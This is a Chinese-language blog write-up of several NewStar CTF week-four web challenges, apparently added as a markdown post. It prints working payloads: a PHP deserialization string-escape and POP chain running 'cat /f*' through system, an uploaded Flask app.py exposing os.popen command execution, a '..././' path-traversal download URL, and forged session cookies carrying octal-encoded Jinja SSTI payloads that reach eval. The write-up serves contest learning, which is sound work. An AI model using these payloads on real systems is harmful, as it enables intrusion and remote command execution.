@@ -1,0 +1,324 @@
+---
+layout: post
+title: newstart新生赛
+categories: [blog ]
+tags: [Ctf,]
+description: "新生赛！"
+image:
+  feature: windows.jpg
+  credit: JYcxk
+  creditlink: azeril.com
+---
+
+## 前言
+
+```java
+Newstar第四周最后一周，赶紧润来看看题
+```
+
+## 逃
+
+```java
+<?php
+highlight_file(__FILE__);
+function waf($str){
+    return str_replace("bad","good",$str);
+}
+
+class GetFlag {
+    public $key;
+    public $cmd = "whoami";
+    public function __construct($key)
+    {
+        $this->key = $key;
+    }
+    public function __destruct()
+    {
+        system($this->cmd);
+    }
+}
+
+unserialize(waf(serialize(new GetFlag($_GET['key'])))); 
+```
+
+```java
+字符的变化 少->多肯定是字符串逃逸，但是我的脑瓜子做这种题就很蒙
+O:7:"GetFlag":2:{s:3:"key";s:81:"27个good";s:3:"cmd";s:7:"cat /f*";}    
+其实少->多就是覆盖全部的字符
+   
+```
+
+O:7:"GetFlag":2:{s:3:"key";s:105:"`badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:7:"cat /f*";}`";s:3:"cmd";s:6:"whoami";}
+
+红色包围的是105个字符，但是waf后就会变为
+
+O:7:"GetFlag":2:{s:3:"key";s:105:"`27个 good`";s:3:"cmd";s:7:"cat /f*";}   `后面到了前面的}就会结束`";s:3:"cmd";s:6:"whoami";}
+
+大致就是这样，所以只用算出 ";s:3:"cmd";s:7:"cat /f*";} 即可有多少个，就有多少个bad
+
+##### 然后发现发现一个`trick`
+
+```java
+  其中S必须大写才会存在16进制,flag.php，可以用16进制绕过
+    'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}'
+```
+
+```jav
+key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad%22;s:3:%22cmd%22;s:7:%22cat%20/f*%22;}
+```
+
+## More Fast
+
+```java
+<?php
+highlight_file(__FILE__);
+
+class Start{
+    public $errMsg;
+    public function __destruct() {
+        die($this->errMsg);
+    }
+}
+
+class Pwn{
+    public $obj;
+    public function __invoke(){
+        $this->obj->evil();
+    }
+    public function evil() {
+        phpinfo();
+    }
+}
+
+class Reverse{
+    public $func;
+    public function __get($var) {
+        ($this->func)();
+    }
+}
+
+class Web{
+    public $func;
+    public $var;
+    public function evil() {
+        if(!preg_match("/flag/i",$this->var)){
+            ($this->func)($this->var);
+        }else{
+            echo "Not Flag";
+        }
+    }
+}
+
+class Crypto{
+    public $obj;
+    public function __toString() {
+        $wel = $this->obj->good;
+        return "NewStar";
+    }
+}
+
+class Misc{
+    public function evil() {
+        echo "good job but nothing";
+    }
+}
+
+$a = @unserialize($_POST['fast']);
+throw new Exception("Nope");
+Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55
+```
+
+呃呃呃一眼GC回收机制，
+
+ ($this->func)($this->var);  这里直接取反发现没成功。。。。qaq
+
+直接system就可以，呃呃呃本地一直括号报错，耽误时间了。。。
+
+![image-20231023135759520](X:/github/cxkjy.github.io/cxkjy.github.io/img/final/image-20231023135759520.png)
+
+```java
+$S=new Start();
+$S->errMsg=new Crypto();
+
+$S->errMsg->obj=new Reverse();
+$S->errMsg->obj->func=new Pwn();
+$S->errMsg->obj->func->obj=new Web();
+$S->errMsg->obj->func->obj->func="system";
+
+$S->errMsg->obj->func->obj->var="cat /f*";
+
+$a=array(0=>$S,1=>3);
+
+//a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:19:"~%8C%86%8C%8B%9A%92";s:3:"var";s:7:"~%93%8C";}}}}}i:0;i:3;}
+echo serialize($a);
+```
+
+## flask disk
+
+可以看到这道题简单的三个功能
+
+![image-20231030130310077](X:/github/cxkjy.github.io/cxkjy.github.io/img/final/image-20231030130310077.png)
+
+admin manage是一个console，说明需要flask算pin码，有个上传文件的地方，发现了题目给的app.py路径，
+
+所以我们现在需要获取app.py的源代码
+
+![image-20231030130627874](X:/github/cxkjy.github.io/cxkjy.github.io/img/final/image-20231030130627874.png)
+
+这个思路也是第一次接触
+
+```java
+访问admin manage发现要输入pin码，说明flask开启了debug模式。flask开启了debug模式下，app.py源文件被修改后会立刻加载。所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了。注意语法不能出错，否则会崩溃。
+```
+
+```python
+from flask import Flask,request
+import os
+app=Flask(__name__)
+@app.route('/')
+def index():
+    try:
+        cmd=request.args.get('cmd')
+        data=os.popen(cmd).read()
+        return data
+    except:
+        pass
+    return "1"
+if __name__=='__main__':
+    app.run(host='0.0.0.0', port=5000, debug=True)
+```
+
+直接传上去即可，
+
+![image-20231030132827703](X:/github/cxkjy.github.io/cxkjy.github.io/img/final/image-20231030132827703.png)
+
+## InjectMe
+
+给了一个dockerfile附件
+
+```jav
+FROM vulhub/flask:1.1.1
+ENV FLAG=flag{not_here}
+COPY src/ /app
+RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
+CMD [ "/start.sh" ]
+EXPOSE 8080
+```
+
+获得信息：都在app/目录下面,肯定有app.py
+
+看到这张图给了源码，用的替换而且不是循环，直接双写绕过 ..././
+
+![image-20231030133031326](X:/github/cxkjy.github.io/cxkjy.github.io/img/final/image-20231030133031326.png)
+
+http://5d20220e-7610-4db3-8bae-f22ae230a3df.node4.buuoj.cn:81/download?file=..././..././..././..././..././..././app/app.py
+
+```java
+import os
+import re
+
+from flask import Flask, render_template, request, abort, send_file, session, render_template_string
+from config import secret_key
+
+app = Flask(__name__)
+app.secret_key = secret_key
+
+
+@app.route('/')
+def hello_world():  # put application's code here
+    return render_template('index.html')
+
+
+@app.route("/cancanneed", methods=["GET"])
+def cancanneed():
+    all_filename = os.listdir('./static/img/')
+    filename = request.args.get('file', '')
+    if filename:
+        return render_template('img.html', filename=filename, all_filename=all_filename)
+    else:
+        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"
+
+
+@app.route("/download", methods=["GET"])
+def download():
+    filename = request.args.get('file', '')
+    if filename:
+        filename = filename.replace('../', '')
+        filename = os.path.join('static/img/', filename)
+        print(filename)
+        if (os.path.exists(filename)) and ("start" not in filename):
+            return send_file(filename)
+        else:
+            abort(500)
+    else:
+        abort(404)
+
+
+@app.route('/backdoor', methods=["GET"])
+def backdoor():
+    try:
+        print(session.get("user"))
+        if session.get("user") is None:
+            session['user'] = "guest"
+        name = session.get("user")
+        if re.findall(
+                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
+                name):
+            abort(500)
+        else:
+            return render_template_string(
+                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
+    except Exception:
+        abort(500)
+
+
+@app.errorhandler(404)
+def page_not_find(e):
+    return render_template('404.html'), 404
+
+
+@app.errorhandler(500)
+def internal_server_error(e):
+    return render_template('500.html'), 500
+
+
+if __name__ == '__main__':
+    app.run('0.0.0.0', port=8080)
+```
+
+```java
+import subprocess
+
+import requests
+import os
+secret_key="y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
+payload="{%print(\"\"[\"\137\137\143\154\141\163\163\137\137\"][\"\137\137\155\162\157\137\137\"][1][\"\137\137\163\165\142\143\154\141\163\163\145\163\137\137\"]())%}"
+
+
+command = "python flask_session_cookie_manager3.py encode -s \"{0}\" -t \"{{'user':'{1}'}}\"".format(secret_key,payload)
+print(command)
+session_data = subprocess.check_output(command, shell=True)
+print(session_data)
+session_data = session_data[:-2].decode('utf-8')
+print(session_data)
+
+url = "http://a77b9424-fb9a-460c-ae14-1c5be4378cb7.node4.buuoj.cn:81/backdoor"
+cookies = {"session": session_data}
+res = requests.get(url=url, cookies=cookies)
+print(res.text)
+```
+
+我这里也是8进制绕过呀为啥不行报错500
+
+key在 /etc/config.py通过看dockerfile可以推断出来
+
+最后还是靠官方wp搞定，呃呃呃看了一下八成是\转义字符的问题，打了一下ctfshow的靶场可以打通
+
+```java
+payload = "{{%print(xxx|attr(\"\"\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\145\\\\166\\\\141\\\\154\"\")({0}))%}}".format(eval_shell)
+
+```
+
+这里外面一层的{}其实是json那个生成session的
+
+![image-20231030210447711](..\img\final\image-20231030210447711.png)
